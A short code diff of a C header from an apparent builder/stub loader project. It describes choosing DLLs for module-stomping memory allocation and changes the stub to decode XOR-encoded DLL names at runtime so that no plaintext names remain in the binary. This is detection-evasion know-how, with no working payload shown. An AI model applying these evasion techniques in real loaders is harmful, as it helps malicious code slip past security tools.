@@ -9,7 +9,8 @@ extern "C" {
 
 /* 10-DLL pool shared between Builder and Stub.
  * Builder picks 3 indices (via --preset or RANDOM) and stores them in .rsrc.
- * Stub reads the indices and uses g_DllPool[idx] as stomp candidates.
+ * Stub decodes names at runtime via the internal DecodeDllName() helper
+ * (XOR-encoded — no plaintext DLL names in .rdata).
  *
  * Index | DLL               | Group
  * ------+-------------------+----------
@@ -24,7 +25,6 @@ extern "C" {
  *   8   | wlanapi.dll       | NETWORK
  *   9   | bcrypt.dll        | CRYPTO
  */
-extern const wchar_t* g_DllPool[10];
 
 /*
  * Allocate memory via Module Stomping.
